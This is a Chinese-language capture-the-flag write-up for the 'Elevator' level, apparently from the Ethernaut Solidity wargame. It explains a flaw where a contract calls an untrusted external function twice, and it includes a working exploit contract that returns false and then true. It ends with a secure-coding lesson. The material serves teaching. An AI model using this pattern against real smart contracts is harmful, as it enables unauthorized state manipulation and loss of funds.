# 第十一关：Elevator
[toc]
### 本关知识点：
```
合约的外部调用
```

## 1. 题目要求
`电梯不会让你达到大楼顶部, 对吧? `

## 2. 代码功能解读
![[Pasted image 20230517101628.png]]

## 3. 漏洞分析
```
到达顶楼就是让top的值为true。
	查看goTo方法逻辑，isLastFloor返回为false才会进入，进入后再次调用isLastFloor来设置top的值，那么我们让第一次方法返回false，第二次返回true，就可以成功实现到达顶楼。
```

## 4. 攻击方法
用flag状态变量来控制，达到每一次调用isLastFloor方法都返回不同值的效果。
``` javascript
contract Exploit is Building {

    Elevator elevator;

    bool flag = false;

  

    constructor(address victim) {

        elevator = Elevator(victim);

    }

  

    function Attack(uint number) public {

        elevator.goTo(number);

    }

  

    function isLastFloor(uint) external returns (bool) {

        if (!flag) {

            flag = true;

            return false;

        } else {

            flag = false;

            return true;

        }

    }

}

```

## 5. 攻击调用图
![[Pasted image 20230517110228.png]]

![[Pasted image 20230517110251.png]]
## 6. 知识点分析

	在我们获取外部调用的结果后，我们应该将他保存到变量中，而不是进行再次调用，这样可能出现不一样的结果，因为所有对外部接口的调用都是危险的！